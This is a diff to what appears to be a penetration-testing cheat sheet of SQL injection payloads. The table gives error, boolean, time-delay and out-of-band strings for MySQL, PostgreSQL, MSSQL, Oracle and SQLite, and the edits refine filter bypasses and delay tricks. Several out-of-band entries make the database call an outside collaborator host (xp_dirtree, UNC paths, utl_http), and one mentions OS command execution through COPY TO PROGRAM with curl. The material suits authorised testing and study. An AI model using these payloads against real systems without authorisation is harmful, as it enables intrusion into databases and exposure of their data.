@@ -34,13 +34,13 @@ Fingerprint the vendor from the error, `X-Powered-By`, a stack trace, or the fun
 
 | Vendor | Error (one cell) | Boolean pair | Time (prefer 1–2s) | OOB (one callback) |
 |---|---|---|---|---|
-| MySQL / MariaDB | `' AND extractvalue(1,concat(0x7e,version()))-- -` | `' AND 1=1-- -` / `' AND 1=2-- -` | `' AND SLEEP(2)-- -` | Windows only: `LOAD_FILE` of a UNC path to `UNIQUE.collab` |
+| MySQL / MariaDB | `' AND extractvalue(1,concat(0x7e,version()))-- -` (error text is capped at 32 chars — a truncated version is still a hit) | `' AND 1=1-- -` / `' AND 1=2-- -` | `' AND SLEEP(2)-- -`. If the keyword is filtered but functions work: `' AND IF(1=1,SLEEP(2),0)-- -`. **`GET_LOCK('h',2)` is not a timer** — it returns immediately when the name is free; do not use it, and do not use `BENCHMARK` | Windows only: `LOAD_FILE` of a UNC path to `UNIQUE.collab` |
 | PostgreSQL | `' AND 1=cast(version() as int)--` | `' AND 1=1--` / `' AND 1=2--` | `' AND 1=(SELECT 1 FROM pg_sleep(2))--` | `COPY ... TO PROGRAM` is OS exec — only after SQLi is proven, one `curl` to your host, no shell |
-| MSSQL | `' AND 1=convert(int,@@version)--` | `' AND 1=1--` / `' AND 1=2--` | `'; WAITFOR DELAY '0:0:2'--` (needs stacked queries) | `'; EXEC master..xp_dirtree '\\\\UNIQUE.collab\\a'--` |
+| MSSQL | `' AND 1=convert(int,@@version)--` | `' AND 1=1--` / `' AND 1=2--` | `' AND 1=1 WAITFOR DELAY '0:0:2'--` (same statement; no `;` required). `'; WAITFOR DELAY '0:0:2'--` only if stacked queries are on | `'; EXEC master..xp_dirtree '\\\\UNIQUE.collab\\a'--` |
 | Oracle | `' AND 1=utl_inaddr.get_host_address((SELECT user FROM dual))--` (error text contains the value) | `' AND 1=1--` / `' AND 1=2--` | `' AND DBMS_PIPE.RECEIVE_MESSAGE('a',2)=1--` (timeout returns 1) | `utl_http.request('http://UNIQUE.collab/')` if the ACL allows it |
 | SQLite | `' AND 1=cast(sqlite_version() as int)--` | `' AND 1=1--` / `' AND 1=2--` | none — do not use huge `RANDOMBLOB` | n/a |
 
-`-- -` (dash, space, dash) is the MySQL-safe comment. `#` also works on MySQL. Postgres/MSSQL/Oracle accept `--`.
+`-- -` (dash, space, dash) is the MySQL-safe comment. `#` also works on MySQL. Postgres/MSSQL/Oracle accept `--`. Oracle `ORA-24247` means the ACL blocked `utl_inaddr` / `utl_http` — the injection still fired. Fall back to the boolean pair. Do not treat that error as "not SQLi".
 
 ## Where it shows up
 - Search, filter, report, export, autocomplete, typeahead.
